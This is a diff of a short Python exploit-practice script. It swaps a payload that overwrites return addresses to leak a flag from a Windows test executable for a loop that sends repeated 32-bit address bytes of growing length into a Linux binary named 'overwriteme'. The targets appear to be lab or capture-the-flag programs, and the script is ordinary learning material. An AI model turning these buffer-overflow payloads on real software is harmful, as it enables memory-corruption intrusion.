@@ -1,19 +1,28 @@
+#!/usr/bin/python3
 from subprocess import Popen, PIPE, STDOUT
+import time
 
-
-call_func = b"\xE8\x8d\x13\x40\x00"#0040138d
-call_addr = b"\x89\x13\x40\x00"
-message = b"\xc5\x12\x40\x00"
-
-flag = b'\x57\x80\x40\x00'
-
-leak_flag = call_func+message*12+b"aaaaaaaaaaa"+flag
 
 
 def stdinInput(path,payload):
-    p = Popen([path], stdout=PIPE, stdin=PIPE, stderr=PIPE)
-    stdout_data = p.communicate(input=payload)[0]
-    print(stdout_data)
+    #print("Sending",payload)
+    try:
+        p = Popen([path], stdout=PIPE, stdin=PIPE, stderr=PIPE)
+        stdout_data = p.communicate(bytes(payload,'utf-8'),timeout=3)[0]
+        print(stdout_data)
+        
+    except Exception as e:
+        print("Unable to communicate with the process")
+        print(e)
     
-    
-stdinInput("C:\\Users\\Austin\\Desktop\\tempProj.exe",leak_flag)
+
+
+def main():
+    path = '/home/austin/Desktop/overwriteme'
+    payload = "\x8b\x87\x04\x08"
+    for i in range(50,201):
+        print(i)
+        stdinInput(path,payload*i)
+
+if __name__ == '__main__':
+    main()
